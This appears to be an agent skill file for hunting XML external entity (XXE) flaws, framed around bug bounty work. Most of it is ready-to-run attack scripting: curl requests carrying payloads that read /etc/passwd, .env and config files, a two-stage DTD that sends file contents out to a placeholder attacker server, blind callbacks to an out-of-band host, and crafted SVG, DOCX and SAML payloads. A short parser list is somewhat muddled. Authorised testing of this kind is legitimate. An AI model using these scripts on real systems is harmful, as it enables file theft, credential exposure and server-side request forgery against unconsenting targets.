---
name: k1nzr3c0n-hunt-xxe
description: "XXE (XML External Entity) hunting skill built from 10 disclosed bug bounty reports. Covers classic file read, OOB exfiltration, two-stage data exfil, SVG upload XXE, SSRF via XXE, XXE in DOCX/XLSX/PPTX (zip XML), SAML assertion XXE, parser security status 2024-2026."
tags: [xxe, xml, ssrf, hunt, web-security, bug-bounty]
report_count: 10
---

# K1NZR3C0N Hunt — XXE (XML External Entity Injection)

> **OOB-Or-It-Didn't-Happen**: blind XXE needs interactsh/Burp callback with data.
> **SVG + DOCX**: most modern XXE is via file upload, not SOAP — check all XML-accepting endpoints.

---

## Crown Jewels

```
Priority 1 — Classic file read: /etc/passwd, /etc/shadow, app secrets
Priority 2 — SSRF via XXE: read cloud metadata (169.254.169.254)
Priority 3 — OOB data exfiltration via DNS/HTTP
Priority 4 — SVG upload XXE (widely accepted file type)
Priority 5 — DOCX/XLSX/PPTX XXE (office file upload chains)
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_xxe_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 6).oastify.com}"
echo "[+] Target: $TARGET | OOB: $OOB"

# Detect XML-accepting endpoints
echo "=== XML/SOAP Endpoints ==="
RUNS_BASE="/app/runs"
grep -rhoP 'https?://[^\s"]+(?:xml|soap|wsdl|rss|atom|feed|upload|import|svg|docx|xlsx)' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/xml_endpoints.txt" | head -20
grep -rihE 'content-type.*xml|application/xml|text/xml|application/soap' \
  "$RUNS_BASE" 2>/dev/null | sort -u | head -10
```

## Phase 1 — Classic XXE (In-Band)

```bash
echo "=== Classic XXE File Read ==="
XML_EP="${XML_ENDPOINT:-https://${TARGET}/api/data}"

# Payload: read /etc/passwd
XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>'

RESP=$(curl -sk -X POST "$XML_EP" \
  -H "Content-Type: application/xml" \
  -d "$XXE_PAYLOAD")
echo "$RESP" | grep -q 'root:' && echo "  [XXE] /etc/passwd read successful!" || echo "  No hit on /etc/passwd"
echo "$RESP" | head -10

# Try other files
for FILE in \
  "file:///etc/hostname" \
  "file:///proc/version" \
  "file:///app/.env" \
  "file:///app/config.py" \
  "file:///var/www/html/config.php" \
  "file:///C:/Windows/win.ini"; do
  
  PAYLOAD='<?xml version="1.0"?><!DOCTYPE a [<!ENTITY e SYSTEM "'"$FILE"'">]><a>&e;</a>'
  RESP=$(curl -sk -X POST "$XML_EP" \
    -H "Content-Type: application/xml" \
    -d "$PAYLOAD" 2>/dev/null)
  [ "${#RESP}" -gt 50 ] && echo "  [HIT] $FILE → ${RESP:0:80}"
done
```

## Phase 2 — Blind XXE (OOB)

```bash
echo "=== Blind XXE OOB ==="
PROBE_ID=$(openssl rand -hex 4)

# OOB via DNS (parameter entity to external DTD)
XXE_OOB='<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://'"${PROBE_ID}.${OOB}"'/xxe.dtd">
  %xxe;
]>
<foo>test</foo>'

curl -sk -X POST "$XML_EP" \
  -H "Content-Type: application/xml" \
  -d "$XXE_OOB" -o /dev/null
echo "  [!] Check OOB for ${PROBE_ID}.${OOB}"

# Two-stage OOB exfiltration (host external DTD on VPS)
echo ""
echo "=== Two-Stage XXE Data Exfil ==="
echo "Host this DTD on your server (xxe.dtd):"
cat << 'DTD'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOURSERVER/?x=%file;'>">
%eval;
%exfil;
DTD
echo ""
echo "Then send this XML to target:"
echo '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOURSERVER/xxe.dtd"> %xxe;]><foo>x</foo>'
```

## Phase 3 — SVG Upload XXE

```bash
echo "=== SVG Upload XXE ==="
# Many apps accept SVG for avatars/images — SVG is XML

SVG_XXE='<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text font-size="12" x="0" y="20">&xxe;</text>
</svg>'

# Find upload endpoints
for EP in /avatar /profile/image /upload /api/upload /images/upload; do
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "https://${TARGET}${EP}")
  [ "$STATUS" -lt 400 ] && echo "  [EXISTS $STATUS] $EP"
done

echo ""
echo "Upload SVG with XXE to avatar/image upload endpoint:"
echo "  curl -sk -X POST https://${TARGET}/avatar \\"
echo "    -F 'file=@xxe.svg;type=image/svg+xml' \\"
echo "    -H 'Authorization: Bearer TOKEN'"
echo "Then GET the uploaded image — if /etc/passwd returned in SVG text → XXE confirmed"
```

## Phase 4 — DOCX/XLSX XXE

```bash
echo "=== DOCX/XLSX Office File XXE ==="
# Office files are ZIP archives containing XML files
# Inject XXE into [Content_Types].xml or document.xml

mkdir -p "$HUNT/docx_xxe"
# Create minimal DOCX with XXE in document.xml
cat > "$HUNT/docx_xxe/[Content_Types].xml" << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
EOF

mkdir -p "$HUNT/docx_xxe/word"
cat > "$HUNT/docx_xxe/word/document.xml" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
EOF

cd "$HUNT/docx_xxe" && zip -r "$HUNT/xxe_test.docx" . && cd - > /dev/null
echo "  Created: $HUNT/xxe_test.docx — upload to any DOCX-accepting endpoint"
```

## Phase 5 — SAML XXE

```bash
echo "=== SAML Assertion XXE ==="
# SAML responses are base64-encoded XML — inject XXE in SAMLResponse
echo "Decode SAMLResponse from login flow, inject XXE, re-encode:"
echo ""
echo "1. Intercept SSO login → copy SAMLResponse parameter"
echo "2. base64 -d <<< 'SAMLRESPONSE' > saml.xml"
echo "3. Edit saml.xml: add <!DOCTYPE...> XXE before <samlp:Response>"
echo "4. base64 -w0 saml.xml → re-encode and submit"
echo ""
echo "XXE payload to inject at top of SAML XML:"
echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
echo "Then reference &xxe; in any SAML attribute value"
```

## Phase 6 — Parser Security Reference (2024-2026)

```
VULNERABLE (default unsafe):
  libxml2 < 2.13  (PHP, Python lxml, Ruby Nokogiri)
  Java SAX (DocumentBuilderFactory without explicit disable)
  .NET XmlDocument (before .NET 4.5.2)
  Python xml.etree.ElementTree (safe but limited)

SAFE BY DEFAULT:
  Python defusedxml
  Java StAX with XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES=false
  Ruby Nokogiri >= 1.13 (safe mode default)
  .NET XmlReader (safe)
```

## Phase 7 — Gate 0

```bash
echo "=== XXE Gate 0 ==="
echo "  □ File content returned in response (not just no-error)"
echo "  □ OOB: HTTP callback with file data in URL parameter"
echo "  □ SVG: uploaded file serves /etc/passwd content in image"
echo "  □ SSRF via XXE: cloud metadata read (169.254.169.254)"
echo "  □ Evidence: full request + response with sensitive file content"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
XXE in [/api/import] allows reading arbitrary files including /etc/passwd
Blind XXE via SVG upload in [avatar endpoint] enables SSRF to AWS metadata service
XXE in SAML assertion processing leads to local file disclosure
```
